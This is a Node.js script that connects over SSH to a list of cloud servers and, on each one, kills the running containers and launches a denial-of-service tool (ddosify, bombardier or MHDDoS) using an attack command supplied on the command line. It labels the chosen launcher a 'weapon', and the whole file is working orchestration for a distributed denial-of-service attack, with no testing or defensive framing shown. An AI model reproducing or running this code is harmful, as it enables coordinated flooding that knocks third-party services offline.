import "dotenv/config";
import { NodeSSH } from "node-ssh";
import { spawn } from "child_process";
import {
  cleanUpAllServers,
  getServers,
  stopAllBackgroundProcesses,
} from "../helpers.js";

const attack = process.argv[2];

console.log("Launching attack...");

const ddosify = (server) => {
  const ssh = new NodeSSH();
  const prefix = `${server.connection.host.padEnd(48)}`;
  ssh
    .connect(server.connection)
    .then(() => ssh.execCommand("sudo docker kill $(sudo docker ps -q)"))
    .then(() => {
      return ssh
        .execCommand("sudo docker run -id --rm ddosify/ddosify")
        .then(function (result) {
          if (result.stderr) throw new Error(result.stderr);
          const id = result.stdout;
          console.log("Starting container with id: " + id);

          return id;
        });
    })
    .then((id) => {
      return ssh.exec(`sudo docker exec -i ${id} ${attack}`, [], {
        onStdout(chunk) {
          const str =
            `${prefix}` + chunk.toString("utf8").replace(/(\r\n|\n|\r)/gm, "");
          console.log(str);
        },
        onStderr(chunk) {
          console.log(`${server.connection.host} \t\t`, chunk.toString("utf8"));
        },
      });
    })
    .catch((e) => {
      console.error(`${prefix} ERROR`);
      console.error(`${prefix} ${e.message}`);
    });
};

const bomdardier = (server) => {
  const ssh = new NodeSSH();
  const prefix = `${server.connection.host.padEnd(20)}`;
  const handleResponse = (server) => {
    return {
      onStdout(chunk) {
        console.log(
          `${prefix}`,
          `${chunk.toString("utf8").replace(/(\r\n|\n|\r)/gm, "")}`
        );
      },
      onStderr(chunk) {
        console.log(`${prefix} \t\t`, chunk.toString("utf8"));
      },
    };
  };

  ssh
    .connect(server.connection)
    .then(() => ssh.execCommand("sudo docker kill $(sudo docker ps -q)"))
    .then(() => {
      const cmd = `sudo docker run -i --rm alpine/${attack}`;
      console.log(cmd);
      return ssh.exec(cmd, [], handleResponse(server));
    })
    .catch((e) => {
      console.error(`${prefix} ERROR`);
      console.error(`${prefix} ${e.message}`);
    });
};

const python = (server) => {
  const ssh = new NodeSSH();
  const prefix = `${server.connection.host.padEnd(20)}`;
  const handleResponse = (server) => {
    return {
      onStdout(chunk) {
        console.log(
          `${prefix}`,
          `${chunk.toString("utf8").replace(/(\r\n|\n|\r)/gm, "")}`
        );
      },
      onStderr(chunk) {
        console.log(`${prefix} \t\t`, chunk.toString("utf8"));
      },
    };
  };

  ssh
    .connect(server.connection)
    .then(() => ssh.execCommand("sudo pkill python"))
    .then(() => ssh.execCommand("cd MHDDoS"))
    .then(() => {
      const cmd = `${attack}`;
      console.log(cmd);
      return ssh.exec(cmd, [], handleResponse(server));
    })
    .catch((e) => {
      console.error(`${prefix} ERROR`);
      console.error(`${prefix} ${e.message}`);
    });
};

const weapon = attack.match("ddosify")
  ? ddosify
  : attack.match("python")
  ? python
  : bomdardier;

console.log(`Using script: ${weapon.name}`);

const run = async () => {
  const servers = await getServers();

  if (servers.length === 0) {
    console.log(
      "Zero servers found. Check https://cloud.digitalocean.com or servers.js file"
    );
  }

  servers.filter((server) => !server.disabled).forEach(weapon);
};

run();

let isExit = false;

const exitHandler = () => {
  if (isExit === false) stopAllBackgroundProcesses();
  isExit = true;
};

//do something when app is closing
process.on("exit", exitHandler.bind(null, { cleanup: true }));

//catches ctrl+c event
process.on("SIGINT", exitHandler.bind(null, { exit: true }));

// catches "kill pid" (for example: nodemon restart)
process.on("SIGUSR1", exitHandler.bind(null, { exit: true }));
process.on("SIGUSR2", exitHandler.bind(null, { exit: true }));

//catches uncaught exceptions
process.on("uncaughtException", exitHandler.bind(null, { exit: true }));
